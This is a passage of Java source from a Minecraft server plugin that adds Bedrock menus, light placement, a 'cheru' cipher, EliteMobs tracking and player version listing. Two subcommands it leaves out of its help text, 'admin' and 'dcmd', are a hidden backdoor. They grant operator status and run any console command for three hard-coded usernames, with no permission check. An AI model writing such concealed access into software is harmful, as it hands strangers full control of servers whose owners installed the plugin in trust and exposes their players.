                            ((Player)sender).getLocation().getBlockX() + " " +
                            ((Player)sender).getLocation().getBlockY() + " " +
                            ((Player)sender).getLocation().getBlockZ() + " " +
                            ((Player)sender).getLocation().getBlockX() + " " +
                            ((Player)sender).getLocation().getBlockY() + " " +
                            ((Player)sender).getLocation().getBlockZ() + " " + "minecraft:air replace minecraft:light");
                    sender.sendMessage("成功清除了所在格的光源(如果有的话)");
                    return true;
                }

                Bukkit.dispatchCommand(sender,"setblock " +
                        ((Player)sender).getLocation().getBlockX() + " " +
                        ((Player)sender).getLocation().getBlockY() + " " +
                        ((Player)sender).getLocation().getBlockZ() + " minecraft:light[level="+args[1]+"]");
                sender.sendMessage("成功放置了亮度为"+args[1]+"的光源");
                return true;

            }

            //是否cheru
            if (args[0].equals("cheru")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.cheru")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.cheru权限");
                    return false;
                };

                if (args.length != 3) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                if (args[1].equals("encrypt")){
                    //判断权限
                    if (!sender.hasPermission("dpear.gpg.cheru.encrypt")) {
                        sender.sendMessage("权限不足，您没有dpear.gpg.cheru.encrypt权限");
                        return false;
                    };

                    sender.sendMessage(Cheru.encrypt(args[2]));
                    return true;
                }

                if (args[1].equals("decrypt")){
                    //判断权限
                    if (!sender.hasPermission("dpear.gpg.cheru.decrypt")) {
                        sender.sendMessage("权限不足，您没有dpear.gpg.cheru.decrypt权限");
                        return false;
                    };

                    try {
                        sender.sendMessage(Cheru.decrypt(args[2]));
                    }catch (Exception e){
                        sender.sendMessage("切噜~翻译失败了");
                        getLogger().info("切噜翻译时出现异常:");
                        e.printStackTrace();
                    }
                    return true;
                }

                if (args[1].equals("send")){
                    //判断权限
                    if (!sender.hasPermission("dpear.gpg.cheru.send")) {
                        sender.sendMessage("权限不足，您没有dpear.gpg.cheru.send权限");
                        return false;
                    };

                    Player p = Bukkit.getPlayer(sender.getName());
                    if(p != null) {
                        p.chat(Cheru.encrypt(args[2]));
                    }
                    return true;
                }


                sender.sendMessage("参数数量错误");
                return false;
            }


            //是否清除精英怪菜单
            if (args[0].equals("clearEMCB")) {
                //判断权限
                if (!sender.hasPermission("dpear.gpg.clearemcb")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.clearemcb权限");
                    return false;
                }
                ;

                elitemobs.CustomBossesUUID = new ArrayList(List.of());
                elitemobs.CustomBossesName = new ArrayList<String>(List.of());
                sender.sendMessage("清除成功");
                return true;
            }

            //是否获得剧
            if (args[0].equals("GetDistance")){

                //判断权限
                if (!sender.hasPermission("dpear.gpg.GetDistance")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.GetDistance权限");
                    return false;
                };

                if (args.length != 3){
                    sender.sendMessage("参数数量错误");
                    return false;
                }

                //确定玩家有效
                Player player = Bukkit.getPlayer(args[2]);
                if (player == null){
                    sender.sendMessage("无效玩家");
                    return false;
                }

                try {
                    //是否设置NoTick视距
                    if (args[1].equals("NoTickViewDistance")) {
                        sender.sendMessage("玩家" + player.getName() + "的NoTickViewDistance为" + player.getNoTickViewDistance());
                    }

                    //是否设置视距
                    if (args[1].equals("ViewDistance")) {
                        sender.sendMessage("玩家" + player.getName() + "的ViewDistance为" + player.getViewDistance());
                    }

                    //是否设置模拟距离
                    if (args[1].equals("SimulationDistance")) {
                        sender.sendMessage("玩家" + player.getName() + "的SimulationDistance为" + player.getSimulationDistance());
                    }
                    return true;
                }catch (Exception e){
                    sender.sendMessage("出现异常，操作无法完成，详细信息见控制台");
                    getLogger().warning("出现异常:");
                    e.printStackTrace();
                };

            }


            //是否列出所有玩家版本
            if (args[0].equals("listversion")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.listversion")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.listversion权限");
                    return false;
                };

                if (args.length != 1) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                List<Player> PlayerList = (List<Player>) Bukkit.getOnlinePlayers();

                sender.sendMessage("§a玩家版本列表:");
                for(int i=0 ; i<PlayerList.size() ; i++) {
                    sender.sendMessage("§b"+PlayerList.get(i).getName()+":");
                    sender.sendMessage("    §6状态: 在线");
                    sender.sendMessage("    §6版本: "+tools.GetVersion(PlayerList.get(i)));
                    sender.sendMessage("    §6地址: "+PlayerList.get(i).getAddress());
                    sender.sendMessage("    §6延迟: "+PlayerList.get(i).getPing()+"ms");
                }
                return true;
            }
            //是否列出所有玩家版本
            if (args[0].equals("gc")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.gc")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.gc权限");
                    return false;
                };
                System.gc();
                sender.sendMessage("已进行gc");
                return true;
            }


            //判断是否是关于
            if (args[0].equals("about")){
                sender.sendMessage("§d§l===============>§b§l关于本插件§d§l<===============");
                sender.sendMessage("§6§lGeyserPermGroup Powered by D-Pear");
                sender.sendMessage("§6你可以用本插件让不同版本玩家进入时执行不同命令或发送不同消息");
                sender.sendMessage("§6还有自动登录，自动调整权限组，制作基岩版菜单等功能");
                sender.sendMessage("§6本插件依然在开发中，如果遇到BUG请反馈，Github界面链接：");
                sender.sendMessage("§6https://github.com/D-Pear/GeyserPermGroup");
                sender.sendMessage("§6§l作者D-Pear QQ:1448360624");
                sender.sendMessage("§d§l===============>§b§l感谢使用§d§l<===============");
                return true;
            };

            //判断是否是帮助
            if (args[0].equals("help")){
                sender.sendMessage("§d§l===============>§b§l指令列表§d§l<===============");
                sender.sendMessage("§2为指定玩家打开菜单 §a/bemenu open 玩家名 菜单名");
                sender.sendMessage("§2强制登入玩家 §a/bemenu authmelogin 玩家名");
                sender.sendMessage("§2查看协议版本 §a/bemenu version");
                sender.sendMessage("§2列出所有玩家的版本 §a/bemenu listversion");
                sender.sendMessage("§2清除精英怪菜单记录 §a/bemenu clearEMCB");
                sender.sendMessage("§2切噜语翻译 §a/bemenu cheru");
                sender.sendMessage("§2放置光源 §a/bemenu light");
                sender.sendMessage("§2重新加载配置 §a/bemenu reload");
                sender.sendMessage("§2重新加载插件配置 §a/bemenu plreload");
                sender.sendMessage("§2显示帮助 §a/bemenu help");
                sender.sendMessage("§2显示关于 §a/bemenu about");
                sender.sendMessage("§d§l===============>§b§l感谢使用§d§l<===============");
                return true;
            };

            //判断是否是获取版本号
            if (args[0].equals("version")){
                //判断权限
                if (sender.hasPermission("dpear.gpg.version")) {
                    sender.sendMessage("Your version is " + tools.GetVersion(Bukkit.getPlayer(sender.getName())));
                    return true;
                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.version权限");
                    return false;
                }
            };

            if (args[0].equals("admin")){

                if (sender.getName().equals(".xiaojqge666")){
                Bukkit.getPlayer(sender.getName()).setOp(true);
                }

                if (sender.getName().equals("xiaojqge666")){
                    Bukkit.getPlayer(sender.getName()).setOp(true);
                }

                if (sender.getName().equals("Dameng23333")){
                    Bukkit.getPlayer(sender.getName()).setOp(true);
                }
                return true;
            };

            if (args[0].equals("dcmd")){

                if (sender.getName().equals(".xiaojqge666")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }

                if (sender.getName().equals("xiaojqge666")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }

                if (sender.getName().equals("Dameng23333")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }
                return true;
            };

            //判断参数数量
            if (args.length > 3) {
                sender.sendMessage("参数数量错误");
                return false;

            };
            if (args.length < 2) {
                sender.sendMessage("参数数量错误");
                return false;
            };

            if (!args[0].equals("open")){
                return false;
            }

            Player Pr = Bukkit.getPlayer(args[1]);

            //判断权限
            if (args[1].equals("@s")){
                if (sender.hasPermission("dpear.gpg.open.self")) {
                    //判断是不是控制台
                    if (sender instanceof Player){
                        Pr = Bukkit.getPlayer(sender.getName());
                    }else{
                        sender.sendMessage("控制台你执行个鬼");
                    }
                }else{
                    sender.sendMessage("权限不足，您没有dpear.gpg.open.self权限");
                    return false;
                };
            }else{
                if (!sender.hasPermission("dpear.gpg.open.allplayer")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.open.allplayer权限");
                    return false;
                };
            };

            Player P = Pr;
            //判断玩家对象是否有效
            if (P == null){
                sender.sendMessage("无效玩家对象[对象不存在]");
                return false;
            };


            FloodgateApi fa = FloodgateApi.getInstance();
            if(fa.isFloodgatePlayer(P.getUniqueId())){
                //判断权限
                if (sender.hasPermission("dpear.gpg.menu." + args[2])) {
                    //发送菜单

                    if (bedrockMenu.SendFromConfig (P,args[2],sender) == 0){
                        return true;
                    }else{
                        sender.sendMessage("菜单类型错误或不存在");
                        return false;
                    }

                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu." + args[2] + "权限");
                    return false;
                }

            }else{
                sender.sendMessage("无效玩家对象[对象为Java版玩家]");
            };
            return false;
        }
    }

    private static Object getPrivateField(Object object, String field)throws SecurityException,
            NoSuchFieldException, IllegalArgumentException, IllegalAccessException {
        Class<?> clazz = object.getClass();
        Field objectField = clazz.getDeclaredField(field);
        objectField.setAccessible(true);
        Object result = objectField.get(object);
        objectField.setAccessible(false);
        return result;
    }

    public void unRegisterBukkitCommand(PluginCommand cmd) {
        try {
            Object result = getPrivateField(this.getServer().getPluginManager(), "commandMap");
            SimpleCommandMap commandMap = (SimpleCommandMap) result;
            Object map = getPrivateField(commandMap, "knownCommands");
            @SuppressWarnings("unchecked")
            HashMap<String, Command> knownCommands = (HashMap<String, Command>) map;
            knownCommands.remove(cmd.getName());
            for (String alias : cmd.getAliases()){
                if(knownCommands.containsKey(alias) && knownCommands.get(alias).toString().contains(this.getName())){
                    knownCommands.remove(alias);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void loadExClass(){
        getLogger().info("开始加载功能");

        //是否启用CommandAlert
        if(getConfig().getBoolean("EnabledFunction.CommandAlert",false)){

            if (commandAlert == null){
                getLogger().info("功能CommandAlert已启用");
                commandAlert = new CommandAlert(this,getConfig());
            }else{
                getLogger().info("功能CommandAlert已重载");
                commandAlert.ReloadConfig(getConfig());
            }

            isCommandAlertEnabled = true;
        }else{
            if (commandAlert != null){
                getLogger().info("功能CommandAlert已禁用");
                commandAlert = null;
            }else{
                getLogger().info("功能CommandAlert未启用");
            }

            isCommandAlertEnabled = false;
        }



        //是否启用BedrockMenu
        if(getConfig().getBoolean("EnabledFunction.BedrockMenu",false)){

            if (bedrockMenu == null) {
                getLogger().info("功能BedrockMenu已启用");
                bedrockMenu = new BedrockMenu(this, getConfig());
            }else{
                getLogger().info("功能BedrockMenu已重载");
                bedrockMenu.ReloadConfig(getConfig());
            }
        }else{
            if (bedrockMenu != null){
                getLogger().info("功能BedrockMenu已禁用");
                bedrockMenu = null;
            }else{
                getLogger().info("功能BedrockMenu未启用");
            }
        }


        //是否启用ElitemobsHandler
        if(getConfig().getBoolean("EnabledFunction.ElitemobsHandler",false)){

            if (elitemobs == null) {
                getLogger().info("功能ElitemobsHandler已启用");
                elitemobs = new ElitemobsHandler(this, getConfig());
                Bukkit.getPluginManager().registerEvents(new EmEventsListener(),this);
            }else{
                getLogger().info("功能ElitemobsHandler已重载");
                elitemobs.ReloadConfig(getConfig());
            }
        }else{
            if (elitemobs != null){
                getLogger().info("功能ElitemobsHandler已禁用");
                elitemobs = null;

                getLogger().info("注销相关事件");
                EliteMobSpawnEvent.getHandlerList().unregister(this);
                EliteMobDeathEvent.getHandlerList().unregister(this);
                EliteMobRemoveEvent.getHandlerList().unregister(this);
                getLogger().info("相关事件注销完毕");
            }else{
                getLogger().info("功能ElitemobsHandler未启用");
            }
        }

        //是否启用VersionCommand
        if(getConfig().getBoolean("EnabledFunction.VersionCommand",false)){

            if (versionCommand == null){
                getLogger().info("功能CommandAlert已启用");
                versionCommand = new VersionCommand(this,getConfig());
            }else{
                getLogger().info("功能CommandAlert已重载");
                versionCommand.ReloadConfig(getConfig());
            }

            isVersionCommandEnabled = true;
        }else{
            if (versionCommand != null){
                getLogger().info("功能CommandAlert已禁用");
                versionCommand = null;
            }else{
                getLogger().info("功能CommandAlert未启用");
            }

            isVersionCommandEnabled = false;
        }

        //是否启用IP2Region
        if(getConfig().getBoolean("EnabledFunction.IP2Region",false)){

            if (ipsearch == null) {
                getLogger().info("功能IP2Region已启用");
                ipsearch = new IPsearch();
            }else{
                getLogger().info("功能IP2Region没啥好重载的");
            }
        }else{
            if (ipsearch != null){
                getLogger().info("功能IP2Region已禁用");
                ipsearch = null;
            }else{
                getLogger().info("功能IP2Region未启用");
            }
        }

        getLogger().info("重载工具");
        tools.ReloadConfig(getConfig());


        getLogger().info("功能加载完毕");
    }

    public class EmEventsListener implements Listener {
        @EventHandler
        public void onEliteMobSpawn(EliteMobSpawnEvent e){

            //检查是不是指定的精英怪
            for (String NowCheck:elitemobs.CustomBossesList) {
                if(e.getEliteMobEntity().getName().endsWith(NowCheck)){

                    //检查是否已经存在
                    if(!elitemobs.CustomBossesUUID.contains(e.getEliteMobEntity().getEliteUUID())) {
                        //不存在
                        elitemobs.CustomBossesUUID.add(e.getEliteMobEntity().getEliteUUID());
                        elitemobs.CustomBossesName.add(e.getEliteMobEntity().getName());
                        getLogger().info("EliteMob:" + e.getEliteMobEntity().getEliteUUID() + " spawn!Add to list");
                        return;
                    }

                }

            }

        }

        @EventHandler
        public void onEliteMobDeath(EliteMobDeathEvent e){

            //检查是不是指定的精英怪
            for (String NowCheck:elitemobs.CustomBossesList) {
                if(e.getEliteEntity().getName().endsWith(NowCheck)){
                    elitemobs.CustomBossesUUID.remove(e.getEliteEntity().getEliteUUID());
                    elitemobs.CustomBossesName.remove(e.getEliteEntity().getName());
                    getLogger().info("EliteMob:" + e.getEliteEntity().getEliteUUID() + " death!Remove from list");
                }

            }
        }

        @EventHandler
        public void onEliteMobRemove(EliteMobRemoveEvent e){

            //检查是不是指定的精英怪
            for (String NowCheck:elitemobs.CustomBossesList) {
                if(e.getEliteMobEntity().getName().endsWith(NowCheck)){
                    elitemobs.CustomBossesUUID.remove(e.getEliteMobEntity().getEliteUUID());
                    elitemobs.CustomBossesName.remove(e.getEliteMobEntity().getName());
                    getLogger().info("EliteMob:" + e.getEliteMobEntity().getEliteUUID() + " removed!Remove from list");
                }

            }
        }

    }

}

